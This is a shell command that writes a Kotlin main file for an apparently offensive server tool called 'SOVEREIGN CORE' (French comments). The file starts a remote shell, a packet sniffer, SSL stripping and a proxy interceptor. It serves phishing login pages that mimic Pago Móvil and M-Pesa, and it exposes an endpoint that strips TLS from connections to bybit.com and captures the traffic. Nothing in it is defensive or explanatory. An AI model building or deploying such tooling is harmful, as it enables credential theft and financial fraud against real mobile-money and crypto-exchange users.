cat << 'EOF' > src/main/kotlin/com/fardc/sigint/core/Main.kt
package com.fardc.sigint.core

import io.javalin.Javalin
import java.time.Instant

fun main(args: Array<String>) {
    println("✅ SOVEREIGN CORE v2.2 (MULTI-TARGET) boot OK @ ${Instant.now()}")

    // 1. Initialisation des Sentinelles
    val gatekeeper = Gatekeeper()
    val killSwitch = KillSwitch()
    val port = args.firstOrNull()?.toIntOrNull() ?: 7070

    // 2. Instanciation des unités de combat
    val rotator = EncryptionKeyRotator()
    val vault = SecurityVault() 
    val interceptor = FinCapInterception()
    val resilience = NetworkResilience()
    val remoteShell = RemoteShell(vault)
    val packetSniffer = PacketSniffer()
    val signalJammer = SignalJammer()
    val signalStealth = SignalStealth()
    val trafficMirror = TrafficMirror()
    val sslStripper = SSLStripper()
    val proxyCapture = ProxyInterceptor(vault)
    
    // Modules de Phishing (VEN & RDC)
    val phishVen = PhishCommander(vault)
    val phishRdc = MPesaCommander(vault)

    // 3. Activation des services persistants
    rotator.startRotation()
    interceptor.runInterceptionMode()
    resilience.monitorSystem()
    remoteShell.startShell(9090)
    packetSniffer.startSniffing(9999)

    // 4. Démarrage du Dashboard Souverain
    val app = Javalin.create().start(port)
    
    // Enregistrement des portails captifs
    phishVen.setupPhishPage(app)  // Route: /login/pagomovil
    phishRdc.setupMPesaPage(app)  // Route: /login/mpesa

    println("🛡️ TUNNEL SÉCURISÉ ACTIF SUR LE PORT $port")
    println("📡 CIBLES DISPONIBLES : Pago Móvil & M-Pesa")

    // 5. Endpoints de contrôle
    app.get("/status") { ctx ->
        ctx.json(mapOf(
            "status" to "COMBAT_READY", 
            "version" to "2.2-MULTI",
            "active_portals" to listOf("PagoMovil", "M-Pesa")
        ))
    }

    app.get("/attack/bybit/engage") { ctx ->
        val target = "https://www.bybit.com"
        val proxyPort = 8082
        val downgraded = sslStripper.downgradeConnection(target)
        proxyCapture.startIntercept(proxyPort)
        signalStealth.stealthConnect(downgraded, proxyPort)
        ctx.result("🔥 [OFFENSIVE] Chaîne engagée : $downgraded -> Port $proxyPort")
    }

    app.post("/emergency/halt") { ctx ->
        proxyCapture.stop()
        killSwitch.engage()
    }
}
EOF
